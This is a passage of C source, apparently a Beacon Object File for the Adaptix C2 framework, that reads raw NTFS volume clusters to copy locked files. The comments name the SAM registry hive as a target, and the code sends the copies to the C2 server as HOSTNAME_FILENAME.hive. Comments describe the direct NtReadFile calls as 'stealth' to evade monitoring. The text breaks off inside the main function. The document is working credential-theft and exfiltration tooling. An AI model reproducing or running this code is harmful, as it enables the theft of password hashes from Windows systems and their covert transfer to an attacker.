#include <windows.h>
#include <stdint.h>
#include "../_include/beacon.h"
#include "../_include/bofdefs.h"
#include "../_include/adaptix.h"
#include "underlaycopy.h"

// Helper function to normalize path for CreateFileW (\\?\ prefix)
BOOL NormalizePathForCreateFileW(LPCWSTR path, WCHAR* normalizedPath, int bufferSize) {
    if (!path || !normalizedPath || bufferSize < 5) {
        return FALSE;
    }
    
    int pathLen = KERNEL32$lstrlenW(path);
    if (pathLen == 0 || pathLen >= bufferSize - 4) {
        return FALSE;
    }
    
    // Check if already has \\?\ prefix
    if (path[0] == L'\\' && path[1] == L'\\' && path[2] == L'?' && path[3] == L'\\') {
        MSVCRT$memcpy(normalizedPath, path, (pathLen + 1) * sizeof(WCHAR));
    } else {
        normalizedPath[0] = L'\\';
        normalizedPath[1] = L'\\';
        normalizedPath[2] = L'?';
        normalizedPath[3] = L'\\';
        MSVCRT$memcpy(normalizedPath + 4, path, (pathLen + 1) * sizeof(WCHAR));
    }
    
    return TRUE;
}

// Helper function to normalize path for NtCreateFile (\??\ prefix)
BOOL NormalizePathForNtCreateFile(LPCWSTR path, WCHAR* normalizedPath, int bufferSize) {
    if (!path || !normalizedPath || bufferSize < 5) {
        return FALSE;
    }
    
    WCHAR fullDestPath[MAX_PATH * 2];
    WCHAR* filePart = NULL;
    DWORD fullPathLen = KERNEL32$GetFullPathNameW(path, MAX_PATH * 2, fullDestPath, &filePart);
    
    if (fullPathLen == 0 || fullPathLen >= MAX_PATH * 2) {
        fullPathLen = KERNEL32$lstrlenW(path);
        if (fullPathLen >= bufferSize - 4) {
            return FALSE;
        }
        MSVCRT$memcpy(fullDestPath, path, (fullPathLen + 1) * sizeof(WCHAR));
    }
    
    // Check if already has \??\ or \\?\ prefix
    if ((fullDestPath[0] == L'\\' && fullDestPath[1] == L'\\' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\') ||
        (fullDestPath[0] == L'\\' && fullDestPath[1] == L'?' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\')) {
        // Already normalized, but convert \\?\ to \??\ if needed
        if (fullDestPath[1] == L'\\') {
            normalizedPath[0] = L'\\';
            normalizedPath[1] = L'?';
            normalizedPath[2] = L'?';
            normalizedPath[3] = L'\\';
            MSVCRT$memcpy(normalizedPath + 4, fullDestPath + 4, (fullPathLen - 3) * sizeof(WCHAR));
        } else {
            if (fullPathLen >= bufferSize) {
                return FALSE;
            }
            MSVCRT$memcpy(normalizedPath, fullDestPath, (fullPathLen + 1) * sizeof(WCHAR));
        }
    } else {
        // Add \??\ prefix
        if (fullPathLen >= bufferSize - 4) {
            return FALSE;
        }
        normalizedPath[0] = L'\\';
        normalizedPath[1] = L'?';
        normalizedPath[2] = L'?';
        normalizedPath[3] = L'\\';
        MSVCRT$memcpy(normalizedPath + 4, fullDestPath, (fullPathLen + 1) * sizeof(WCHAR));
    }
    
    return TRUE;
}

// Helper function to create output file using NtCreateFile
BOOL CreateOutputFileNt(LPCWSTR destPath, HANDLE* hOutput) {
    WCHAR normalizedDestPath[MAX_PATH * 2];
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING outputPath;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    
    if (!NormalizePathForNtCreateFile(destPath, normalizedDestPath, MAX_PATH * 2)) {
        return FALSE;
    }
    
    NTDLL$RtlInitUnicodeString(&outputPath, normalizedDestPath);
    
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = &outputPath;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;
    
    status = NTDLL$NtCreateFile(
        hOutput,
        FILE_WRITE_DATA | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL,
        0
    );
    
    return NT_SUCCESS(status);
}

// Common I/O functions to reduce code duplication

// Write sparse data to file
BOOL WriteSparseToFile(HANDLE hOutput, ULONGLONG offset, ULONGLONG size, BYTE* tempBuffer) {
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    
    MSVCRT$memset(tempBuffer, 0, (size_t)size);
    
    LARGE_INTEGER writeOffset;
    writeOffset.QuadPart = offset;
    
    status = NTDLL$NtWriteFile(
        hOutput,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        tempBuffer,
        (ULONG)size,
        &writeOffset,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    
    // Note: bytesWritten is updated in caller using size parameter
    return TRUE;
}

// Write sparse data to memory
void WriteSparseToMemory(BYTE* destBuffer, ULONGLONG offset, ULONGLONG size) {
    MSVCRT$memset(destBuffer + offset, 0, (size_t)size);
}

// Copy chunk from volume to file
BOOL CopyChunkToFile(HANDLE hVolume, HANDLE hOutput, ULONGLONG diskOffset, ULONGLONG toCopy, ULONGLONG writeOffset, BYTE* buffer, DWORD bufferSize, ULONGLONG* bytesWritten) {
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    ULONGLONG copied = 0;
    
    *bytesWritten = 0;
    
    while (copied < toCopy) {
        ULONG chunkSize = (ULONG)((toCopy - copied > bufferSize) ? bufferSize : (toCopy - copied));
        
        LARGE_INTEGER readOffset;
        readOffset.QuadPart = diskOffset + copied;
        
        status = NTDLL$NtReadFile(
            hVolume,
            NULL,
            NULL,
            NULL,
            &ioStatus,
            buffer,
            chunkSize,
            &readOffset,
            NULL
        );
        
        if (!NT_SUCCESS(status)) {
            return FALSE;
        }
        
        if (ioStatus.Information == 0) {
            return FALSE;
        }
        
        LARGE_INTEGER writeOffsetLarge;
        writeOffsetLarge.QuadPart = writeOffset + copied;
        
        status = NTDLL$NtWriteFile(
            hOutput,
            NULL,
            NULL,
            NULL,
            &ioStatus,
            buffer,
            (ULONG)ioStatus.Information,
            &writeOffsetLarge,
            NULL
        );
        
        if (!NT_SUCCESS(status)) {
            return FALSE;
        }
        
        copied += ioStatus.Information;
        MSVCRT$memset(buffer, 0, bufferSize);
    }
    
    *bytesWritten = copied;
    return TRUE;
}

// Copy chunk from volume to memory
BOOL CopyChunkToMemory(HANDLE hVolume, BYTE* destBuffer, ULONGLONG destOffset, ULONGLONG diskOffset, ULONGLONG toCopy, BYTE* readBuffer, DWORD bufferSize, ULONGLONG* bytesCopied) {
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    ULONGLONG copied = 0;
    
    *bytesCopied = 0;
    
    while (copied < toCopy) {
        ULONG chunkSize = (ULONG)((toCopy - copied > bufferSize) ? bufferSize : (toCopy - copied));
        
        LARGE_INTEGER readOffset;
        readOffset.QuadPart = diskOffset + copied;
        
        status = NTDLL$NtReadFile(
            hVolume,
            NULL,
            NULL,
            NULL,
            &ioStatus,
            readBuffer,
            chunkSize,
            &readOffset,
            NULL
        );
        
        if (!NT_SUCCESS(status)) {
            return FALSE;
        }
        
        if (ioStatus.Information == 0) {
            return FALSE;
        }
        
        MSVCRT$memcpy(destBuffer + destOffset + copied, readBuffer, (size_t)ioStatus.Information);
        copied += ioStatus.Information;
        MSVCRT$memset(readBuffer, 0, bufferSize);
    }
    
    *bytesCopied = copied;
    return TRUE;
}

// Copy file by extents directly to memory buffer (for Metadata mode download)
BOOL CopyFileByExtentsToMemory(HANDLE hVolume, EXTENT* extents, DWORD extentCount, ULONGLONG clusterSize, ULONGLONG fileSize, BYTE** outputBuffer, ULONGLONG* outputSize) {
    ULONGLONG bytesCopied = 0;
    BYTE* readBuffer = NULL;
    DWORD bufferSize = 64 * 1024;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    
    *outputBuffer = NULL;
    *outputSize = 0;
    
    if (fileSize > 0x7FFFFFFF) {
        return FALSE; // File too large
    }
    
    BYTE* tempBuffer = (BYTE*)intAlloc((SIZE_T)fileSize);
    if (!tempBuffer) {
        return FALSE;
    }
    
    readBuffer = (BYTE*)intAlloc(bufferSize);
    if (!readBuffer) {
        intFree(tempBuffer);
        return FALSE;
    }
    
    for (DWORD i = 0; i < extentCount; i++) {
        ULONGLONG extentBytes = extents[i].lengthClusters * clusterSize;
        ULONGLONG remaining = fileSize - bytesCopied;
        ULONGLONG toCopy = (extentBytes > remaining) ? remaining : extentBytes;
        
        if (toCopy == 0) break;
        
        // Check for sparse extent (LCN = -1)
        if (extents[i].lcn == (ULONGLONG)-1) {
            WriteSparseToMemory(tempBuffer, bytesCopied, toCopy);
            bytesCopied += toCopy;
            continue;
        }
        
        ULONGLONG diskOffset = extents[i].lcn * clusterSize;
        ULONGLONG copied = 0;
        
        if (!CopyChunkToMemory(hVolume, tempBuffer, bytesCopied, diskOffset, toCopy, readBuffer, bufferSize, &copied)) {
            if (bytesCopied >= fileSize) {
                break;
            }
            intFree(readBuffer);
            intFree(tempBuffer);
            return FALSE;
        }
        
        bytesCopied += copied;
        if (bytesCopied >= fileSize) break;
    }
    
    MSVCRT$memset(readBuffer, 0, bufferSize);
    intFree(readBuffer);
    
    if (bytesCopied != fileSize) {
        intFree(tempBuffer);
        return FALSE;
    }
    
    *outputBuffer = tempBuffer;
    *outputSize = bytesCopied;
    return TRUE;
}

// Helper function to read NTFS boot sector (stealth mode - no logging)
BOOL ReadNtfsBoot(HANDLE hVolume, NTFS_BOOT* boot) {
    BYTE buffer[512];
    IO_STATUS_BLOCK ioStatus;
    LARGE_INTEGER offset;
    NTSTATUS status;
    offset.QuadPart = 0;

    // Use direct NtReadFile for stealth
    status = NTDLL$NtReadFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        buffer,
        512,
        &offset,
        NULL
    );

    if (!NT_SUCCESS(status) || ioStatus.Information != 512) {
        return FALSE;
    }

    boot->bytesPerSector = *(WORD*)(buffer + BOOT_BYTES_PER_SECTOR);
    boot->sectorsPerCluster = buffer[BOOT_SECTORS_PER_CLUSTER];
    boot->clusterSize = boot->bytesPerSector * boot->sectorsPerCluster;
    boot->mftCluster = *(ULONGLONG*)(buffer + BOOT_MFT_CLUSTER);

    // Clear buffer from memory
    MSVCRT$memset(buffer, 0, sizeof(buffer));

    return TRUE;
}

// Get file information using GetFileInformationByHandle
BOOL GetNtfsFileInfo(LPCWSTR filePath, ULONGLONG* mftRecordNumber, ULONGLONG* fileSize) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BY_HANDLE_FILE_INFORMATION fileInfo;
    WCHAR normalizedPath[MAX_PATH * 2];

    if (!NormalizePathForCreateFileW(filePath, normalizedPath, MAX_PATH * 2)) {
        return FALSE;
    }

    hFile = KERNEL32$CreateFileW(
        normalizedPath,
        FILE_READ_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (!KERNEL32$GetFileInformationByHandle(hFile, &fileInfo)) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    // Extract MFT record number from FileIndex
    ULONGLONG frn = ((ULONGLONG)fileInfo.nFileIndexHigh << 32) | fileInfo.nFileIndexLow;
    *mftRecordNumber = frn & 0x0000FFFFFFFFFFFF;
    *fileSize = ((ULONGLONG)fileInfo.nFileSizeHigh << 32) | fileInfo.nFileSizeLow;

    KERNEL32$CloseHandle(hFile);
    return TRUE;
}

// Read MFT record (using direct NtReadFile for stealth)
BOOL ReadMftRecord(HANDLE hVolume, NTFS_BOOT* boot, ULONGLONG recordNumber, BYTE* record) {
    ULONGLONG mftOffset = boot->mftCluster * boot->clusterSize;
    ULONGLONG recordOffset = mftOffset + (recordNumber * MFT_RECORD_SIZE);
    LARGE_INTEGER offset;
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;

    offset.QuadPart = recordOffset;

    // Use direct NtReadFile for stealth
    status = NTDLL$NtReadFile(
        hVolume,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        record,
        MFT_RECORD_SIZE,
        &offset,
        NULL
    );

    if (!NT_SUCCESS(status) || ioStatus.Information != MFT_RECORD_SIZE) {
        return FALSE;
    }

    return TRUE;
}

// Parse data runs from $DATA attribute
int ParseDataRuns(BYTE* dataRuns, int dataRunsSize, DATA_RUN** runs, NTFS_BOOT* boot) {
    int pos = 0;
    ULONGLONG currentLCN = 0;
    int runCount = 0;
    DATA_RUN* runArray = NULL;
    int arraySize = 0;

    while (pos < dataRunsSize && dataRuns[pos] != 0x00) {
        BYTE header = dataRuns[pos++];
        BYTE lenSize = header & 0x0F;
        BYTE offSize = (header >> 4) & 0x0F;

        if (lenSize == 0 || lenSize > 8 || offSize > 8) {
            break;
        }

        // Read length
        ULONGLONG length = 0;
        int i;
        for (i = 0; i < lenSize; i++) {
            length |= ((ULONGLONG)dataRuns[pos++]) << (8 * i);
        }

        // Read offset (relative LCN)
        ULONGLONG offset = 0;
        BOOL isSparse = (offSize == 0);
        
        if (offSize > 0) {
            for (i = 0; i < offSize; i++) {
                offset |= ((ULONGLONG)dataRuns[pos++]) << (8 * i);
            }
            // Two's complement sign extension
            if (offSize < 8 && (dataRuns[pos - 1] & 0x80)) {
                ULONGLONG signExtend = ((ULONGLONG)0xFFFFFFFFFFFFFFFF) << (8 * offSize);
                offset |= signExtend;
            }
            currentLCN += offset;
        }
        // If offSize == 0, this is a sparse cluster - don't update currentLCN

        // Reallocate array if needed
        if (runCount >= arraySize) {
            arraySize = arraySize == 0 ? 16 : arraySize * 2;
            DATA_RUN* newArray = (DATA_RUN*)intAlloc(sizeof(DATA_RUN) * arraySize);
            if (runArray) {
                MSVCRT$memcpy(newArray, runArray, sizeof(DATA_RUN) * runCount);
                intFree(runArray);
            }
            runArray = newArray;
        }

        // For sparse clusters (offSize == 0), set LCN to 0 to mark as sparse
        runArray[runCount].lcn = isSparse ? 0 : currentLCN;
        runArray[runCount].length = length;
        runCount++;
    }

    *runs = runArray;
    return runCount;
}

// Get file info from MFT record
BOOL GetFileInfoFromRecord(BYTE* record, FILE_INFO* fileInfo, NTFS_BOOT* boot) {
    WORD attrOffset = *(WORD*)(record + 20);
    fileInfo->hasRuns = FALSE;
    fileInfo->isResident = FALSE;
    fileInfo->runs = NULL;
    fileInfo->runCount = 0;
    fileInfo->residentData = NULL;
    fileInfo->residentDataSize = 0;

    while (attrOffset < MFT_RECORD_SIZE) {
        DWORD attrType = *(DWORD*)(record + attrOffset);
        if (attrType == ATTRIBUTE_END) {
            break;
        }

        DWORD attrLength = *(DWORD*)(record + attrOffset + 4);
        if (attrLength == 0 || attrOffset + attrLength > MFT_RECORD_SIZE) {
            break;
        }

        BYTE nonResident = record[attrOffset + 8];

        // Handle $DATA attribute
        if (attrType == ATTRIBUTE_DATA) {
            if (nonResident == 0) {
                // Resident data
                fileInfo->isResident = TRUE;
                fileInfo->fileSize = *(ULONGLONG*)(record + attrOffset + 16);
                WORD valueOffset = *(WORD*)(record + attrOffset + 20);
                fileInfo->residentDataSize = (DWORD)fileInfo->fileSize;
                fileInfo->residentData = (BYTE*)intAlloc(fileInfo->residentDataSize);
                MSVCRT$memcpy(fileInfo->residentData, record + attrOffset + valueOffset, fileInfo->residentDataSize);
            } else {
                // Non-resident data
                fileInfo->isResident = FALSE;
                fileInfo->fileSize = *(ULONGLONG*)(record + attrOffset + 48);
                WORD dataRunsOffset = *(WORD*)(record + attrOffset + 32);
                int dataRunsSize = attrLength - dataRunsOffset;
                BYTE* dataRuns = record + attrOffset + dataRunsOffset;

                fileInfo->runCount = ParseDataRuns(dataRuns, dataRunsSize, &fileInfo->runs, boot);
                fileInfo->hasRuns = (fileInfo->runCount > 0);
            }
            break;
        }

        attrOffset += attrLength;
    }

    return TRUE;
}

// Copy file by extents (MFT mode) - stealth implementation
BOOL CopyFileByMft(HANDLE hVolume, HANDLE hOutput, FILE_INFO* fileInfo, NTFS_BOOT* boot) {
    ULONGLONG bytesWritten = 0;
    BYTE* buffer = NULL;
    DWORD bufferSize = 64 * 1024; // 64KB buffer for stealth (smaller = less memory footprint)
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;

    buffer = (BYTE*)intAlloc(bufferSize);
    if (!buffer) {
        return FALSE;
    }

    if (fileInfo->isResident) {
        // Copy resident data using NtWriteFile for stealth
        LARGE_INTEGER writeOffset;
        writeOffset.QuadPart = 0;
        status = NTDLL$NtWriteFile(
            hOutput,
            NULL,
            NULL,
            NULL,
            &ioStatus,
            fileInfo->residentData,
            fileInfo->residentDataSize,
            &writeOffset,
            NULL
        );
        if (!NT_SUCCESS(status)) {
            intFree(buffer);
            return FALSE;
        }
        bytesWritten = ioStatus.Information;
    } else if (fileInfo->hasRuns) {
        // Copy non-resident data
        int i;
        for (i = 0; i < fileInfo->runCount; i++) {
            ULONGLONG toRead = fileInfo->runs[i].length * boot->clusterSize;
            ULONGLONG remaining = fileInfo->fileSize - bytesWritten;
            if (toRead > remaining) {
                toRead = remaining;
            }
            if (toRead == 0) {
                break;
            }

            if (fileInfo->runs[i].lcn == 0) {
                // Sparse cluster - write zeros
                if (!WriteSparseToFile(hOutput, bytesWritten, toRead, buffer)) {
                    intFree(buffer);
                    return FALSE;
                }
                bytesWritten += toRead;
                continue;
            }

            ULONGLONG diskOffset = fileInfo->runs[i].lcn * boot->clusterSize;
            ULONGLONG copied = 0;
            
            if (!CopyChunkToFile(hVolume, hOutput, diskOffset, toRead, bytesWritten, buffer, bufferSize, &copied)) {
                // If we've copied some data and reached file size, it's OK
                if (bytesWritten >= fileInfo->fileSize) {
                    break;
                }
                intFree(buffer);
                return FALSE;
            }
            
            bytesWritten += copied;

            if (bytesWritten >= fileInfo->fileSize) {
                break;
            }
        }
    }

    // Clear buffer before freeing
    MSVCRT$memset(buffer, 0, bufferSize);
    intFree(buffer);
    
    // Verify that we copied the complete file
    if (bytesWritten != fileInfo->fileSize) {
        return FALSE;
    }
    
    return TRUE;
}

// Get file extents using FSCTL_GET_RETRIEVAL_POINTERS (Metadata mode)
int GetFileExtents(HANDLE hFile, EXTENT** extents, DWORD* extentCount) {
    DWORD bytesReturned = 0;
    DWORD bufferSize = 4096;
    BYTE* buffer = NULL;
    STARTING_VCN_INPUT_BUFFER inputBuffer = {0};
    PRETRIEVAL_POINTERS_BUFFER outputBuffer = NULL;
    EXTENT* extentArray = NULL;
    int result = 0;
    
    inputBuffer.StartingVcn.QuadPart = 0;
    
    // Allocate buffer for retrieval pointers
    buffer = (BYTE*)intAlloc(bufferSize);
    if (!buffer) {
        return 0;
    }
    
    // First call to get required buffer size
    if (!KERNEL32$DeviceIoControl(
        hFile,
        FSCTL_GET_RETRIEVAL_POINTERS,
        &inputBuffer,
        sizeof(inputBuffer),
        buffer,
        bufferSize,
        &bytesReturned,
        NULL
    )) {
        DWORD error = KERNEL32$GetLastError();
        if (error == ERROR_MORE_DATA) {
            // Need larger buffer
            intFree(buffer);
            bufferSize = bytesReturned;
            buffer = (BYTE*)intAlloc(bufferSize);
            if (!buffer) {
                return 0;
            }
            
            // Retry with larger buffer
            if (!KERNEL32$DeviceIoControl(
                hFile,
                FSCTL_GET_RETRIEVAL_POINTERS,
                &inputBuffer,
                sizeof(inputBuffer),
                buffer,
                bufferSize,
                &bytesReturned,
                NULL
            )) {
                intFree(buffer);
                return 0;
            }
        } else {
            intFree(buffer);
            return 0;
        }
    }
    
    outputBuffer = (PRETRIEVAL_POINTERS_BUFFER)buffer;
    
    // Allocate extent array
    extentArray = (EXTENT*)intAlloc(sizeof(EXTENT) * outputBuffer->ExtentCount);
    if (!extentArray) {
        intFree(buffer);
        return 0;
    }
    
    // Parse extents
    for (DWORD i = 0; i < outputBuffer->ExtentCount; i++) {
        LARGE_INTEGER nextVcn = outputBuffer->Extents[i].NextVcn;
        LARGE_INTEGER lcn = outputBuffer->Extents[i].Lcn;
        LARGE_INTEGER currentVcn = (i == 0) ? outputBuffer->StartingVcn : outputBuffer->Extents[i-1].NextVcn;
        
        extentArray[i].lcn = lcn.QuadPart;
        extentArray[i].lengthClusters = nextVcn.QuadPart - currentVcn.QuadPart;
    }
    
    *extents = extentArray;
    *extentCount = outputBuffer->ExtentCount;
    result = outputBuffer->ExtentCount;
    
    intFree(buffer);
    return result;
}

// Copy file by extents (Metadata mode) - stealth implementation
BOOL CopyFileByExtents(HANDLE hVolume, HANDLE hOutput, EXTENT* extents, DWORD extentCount, ULONGLONG clusterSize, ULONGLONG fileSize) {
    ULONGLONG bytesWritten = 0;
    BYTE* buffer = NULL;
    DWORD bufferSize = 64 * 1024; // 64KB buffer
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    
    buffer = (BYTE*)intAlloc(bufferSize);
    if (!buffer) {
        return FALSE;
    }
    
    for (DWORD i = 0; i < extentCount; i++) {
        ULONGLONG extentBytes = extents[i].lengthClusters * clusterSize;
        ULONGLONG remaining = fileSize - bytesWritten;
        ULONGLONG toCopy = (extentBytes > remaining) ? remaining : extentBytes;
        
        if (toCopy == 0) {
            break;
        }
        
        // Check for sparse extent (LCN = -1 indicates sparse cluster in FSCTL_GET_RETRIEVAL_POINTERS)
        // Note: LCN = 0 is a valid cluster (boot sector), so we only check for -1
        if (extents[i].lcn == (ULONGLONG)-1) {
            // Sparse extent - write zeros
            if (!WriteSparseToFile(hOutput, bytesWritten, toCopy, buffer)) {
                intFree(buffer);
                return FALSE;
            }
            bytesWritten += toCopy;
            continue;
        }
        
        ULONGLONG diskOffset = extents[i].lcn * clusterSize;
        ULONGLONG copied = 0;
        
        if (!CopyChunkToFile(hVolume, hOutput, diskOffset, toCopy, bytesWritten, buffer, bufferSize, &copied)) {
            // If we've copied some data and reached file size, it's OK
            if (bytesWritten >= fileSize) {
                break;
            }
            intFree(buffer);
            return FALSE;
        }
        
        bytesWritten += copied;
        
        if (bytesWritten >= fileSize) {
            break;
        }
    }
    
    // Clear buffer before freeing
    MSVCRT$memset(buffer, 0, bufferSize);
    intFree(buffer);
    
    // Verify that we copied the complete file
    if (bytesWritten != fileSize) {
        return FALSE;
    }
    
    return TRUE;
}

// Copy file by extents directly to memory buffer (for download to server)
BOOL CopyFileByMftToMemory(HANDLE hVolume, FILE_INFO* fileInfo, NTFS_BOOT* boot, BYTE** outputBuffer, ULONGLONG* outputSize) {
    ULONGLONG bytesCopied = 0;
    BYTE* buffer = NULL;
    DWORD bufferSize = 64 * 1024; // 64KB buffer
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    BYTE* resultBuffer = NULL;

    *outputBuffer = NULL;
    *outputSize = 0;

    // Allocate output buffer
    if (fileInfo->fileSize > 0x7FFFFFFF) {
        BeaconPrintf(CALLBACK_ERROR, "[-] File too large: %llu bytes\n", fileInfo->fileSize);
        return FALSE; // File too large
    }
    resultBuffer = (BYTE*)intAlloc((SIZE_T)fileInfo->fileSize);
    if (!resultBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate buffer for file (%llu bytes)\n", fileInfo->fileSize);
        return FALSE;
    }

    buffer = (BYTE*)intAlloc(bufferSize);
    if (!buffer) {
        intFree(resultBuffer);
        return FALSE;
    }

    if (fileInfo->isResident) {
        // Copy resident data directly
        if (fileInfo->residentData && fileInfo->residentDataSize > 0) {
            MSVCRT$memcpy(resultBuffer, fileInfo->residentData, fileInfo->residentDataSize);
            bytesCopied = fileInfo->residentDataSize;
        } else {
            intFree(resultBuffer);
            intFree(buffer);
            return FALSE;
        }
    } else if (fileInfo->hasRuns && fileInfo->runCount > 0) {
        // Copy non-resident data
        int i;
        for (i = 0; i < fileInfo->runCount; i++) {
            ULONGLONG toRead = fileInfo->runs[i].length * boot->clusterSize;
            ULONGLONG remaining = fileInfo->fileSize - bytesCopied;
            if (toRead > remaining) {
                toRead = remaining;
            }
            if (toRead == 0) {
                break;
            }

            if (fileInfo->runs[i].lcn == 0) {
                // Sparse cluster - write zeros
                WriteSparseToMemory(resultBuffer, bytesCopied, toRead);
                bytesCopied += toRead;
                continue;
            }

            ULONGLONG diskOffset = fileInfo->runs[i].lcn * boot->clusterSize;
            ULONGLONG copied = 0;
            
            if (!CopyChunkToMemory(hVolume, resultBuffer, bytesCopied, diskOffset, toRead, buffer, bufferSize, &copied)) {
                // If we've copied some data and reached file size, it's OK
                if (bytesCopied >= fileInfo->fileSize) {
                    break;
                }
                intFree(resultBuffer);
                intFree(buffer);
                return FALSE;
            }
            
            bytesCopied += copied;

            if (bytesCopied >= fileInfo->fileSize) {
                break;
            }
        }
    } else {
        // File has no data runs and is not resident - empty file or error
        if (fileInfo->fileSize == 0) {
            // Empty file is valid
            bytesCopied = 0;
        } else {
            // Error: file has size but no data
            BeaconPrintf(CALLBACK_ERROR, "[-] File has size (%llu) but no data (not resident, no runs)\n", fileInfo->fileSize);
            intFree(resultBuffer);
            intFree(buffer);
            return FALSE;
        }
    }

    // Clear buffer before freeing
    MSVCRT$memset(buffer, 0, bufferSize);
    intFree(buffer);

    // Verify that we copied the complete file
    if (bytesCopied != fileInfo->fileSize) {
        intFree(resultBuffer);
        return FALSE;
    }
    
    *outputBuffer = resultBuffer;
    *outputSize = bytesCopied;
    return TRUE;
}

// Download file to server using Adaptix API
// Format: HOSTNAME_FILENAME.hive
BOOL download_file(IN LPCSTR sourcePath, IN LPCSTR customFileName, IN char* fileData, IN ULONG32 fileLength) {
    if (!fileData || fileLength == 0) {
        return FALSE;
    }
    
    // Get hostname
    DWORD hostnameSize = MAX_COMPUTERNAME_LENGTH + 1;
    char* hostname = (char*)intAlloc(hostnameSize);
    if (!hostname) {
        return FALSE;
    }
    
    if (!KERNEL32$GetComputerNameA(hostname, &hostnameSize)) {
        intFree(hostname);
        return FALSE;
    }
    
    // Extract filename from source path or use custom filename
    char* fileName = NULL;
    BOOL needFreeFileName = FALSE;
    
    if (customFileName && MSVCRT$strlen(customFileName) > 0) {
        // Extract filename from custom path (e.g., ".\SAM2" -> "SAM2")
        char* lastSlash = MSVCRT$strrchr(customFileName, '\\');
        if (!lastSlash) {
            lastSlash = MSVCRT$strrchr(customFileName, '/');
        }
        
        const char* fileNamePtr = lastSlash ? (lastSlash + 1) : customFileName;
        int fileNameLen = MSVCRT$strlen(fileNamePtr) + 1;
        fileName = (char*)intAlloc(fileNameLen);
        if (!fileName) {
            intFree(hostname);
            return FALSE;
        }
        MSVCRT$strcpy(fileName, fileNamePtr);
        needFreeFileName = TRUE;
    } else if (sourcePath) {
        // Extract filename from source path
        char* lastSlash = MSVCRT$strrchr(sourcePath, '\\');
        if (!lastSlash) {
            lastSlash = MSVCRT$strrchr(sourcePath, '/');
        }
        
        const char* fileNamePtr = lastSlash ? (lastSlash + 1) : sourcePath;
        int fileNameLen = MSVCRT$strlen(fileNamePtr) + 1;
        fileName = (char*)intAlloc(fileNameLen);
        if (!fileName) {
            intFree(hostname);
            return FALSE;
        }
        MSVCRT$strcpy(fileName, fileNamePtr);
        needFreeFileName = TRUE;
    } else {
        intFree(hostname);
        return FALSE;
    }
    
    // Remove extension from filename if present
    char* fileExt = MSVCRT$strrchr(fileName, '.');
    int baseNameLen = fileExt ? (fileExt - fileName) : MSVCRT$strlen(fileName);
    
    // Allocate buffer for final filename: HOSTNAME_FILENAME.hive
    int finalNameLen = hostnameSize + baseNameLen + 6; // +6 for "_" and ".hive\0"
    char* finalFileName = (char*)intAlloc(finalNameLen);
    if (!finalFileName) {
        if (needFreeFileName) {
            intFree(fileName);
        }
        intFree(hostname);
        return FALSE;
    }
    
    // Build filename: HOSTNAME_FILENAME.hive
    MSVCRT$sprintf(finalFileName, "%.*s_%.*s.hive", 
        (int)hostnameSize, hostname,
        baseNameLen, fileName);
    
    // Download to server
    AxDownloadMemory(finalFileName, fileData, (int)fileLength);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] File downloaded to server: %s (%lu bytes)\n", finalFileName, fileLength);
    
    // Cleanup
    intFree(finalFileName);
    if (needFreeFileName) {
        intFree(fileName);
    }
    intFree(hostname);
    
    return TRUE;
}

// Main function
void go(char* args, int len) {
    datap parser;
    char* mode = NULL;
    char* sourceFile = NULL;
    char* destFile = NULL;
    int downloadToServer = 0;  // 0 = write to disk, 1 = download to server
    WCHAR* sourceFileW = NULL;
    WCHAR* destFileW = NULL;
    HANDLE hVolume = INVALID_HANDLE_VALUE;
    HANDLE hOutput = INVALID_HANDLE_VALUE;
    NTFS_BOOT boot = {0};
    FILE_INFO fileInfo = {0};
    BYTE* mftRecord = NULL;
    ULONGLONG mftRecordNumber = 0;
    ULONGLONG fileSize = 0;
    BOOL success = FALSE;
    BYTE* fileBuffer = NULL;  // Buffer for file data when downloading to server

    BeaconDataParse(&parser, args, len);
    mode = BeaconDataExtract(&parser, NULL);
    sourceFile = BeaconDataExtract(&parser, NULL);
    destFile = BeaconDataExtract(&parser, NULL);
    downloadToServer = BeaconDataInt(&parser);

    if (!mode || !sourceFile) {
        return;
    }
    
    // Check if destFile is empty string (when --download is used without destination)
    if (destFile && MSVCRT$strlen(destFile) == 0) {
        destFile = NULL;
    }
    
    // If downloading to server, destFile is optional (used as filename on server)
    // If saving to disk, destFile is required
    if (!downloadToServer && !destFile) {
        return;
    }

    // Convert to wide char
    int sourceLen = MSVCRT$strlen(sourceFile) + 1;
    sourceFileW = (WCHAR*)intAlloc(sourceLen * sizeof(WCHAR));
    KERNEL32$MultiByteToWideChar(CP_ACP, 0, sourceFile, -1, sourceFileW, sourceLen);
    
    if (destFile) {
        int destLen = MSVCRT$strlen(destFile) + 1;
        destFileW = (WCHAR*)intAlloc(destLen * sizeof(WCHAR));
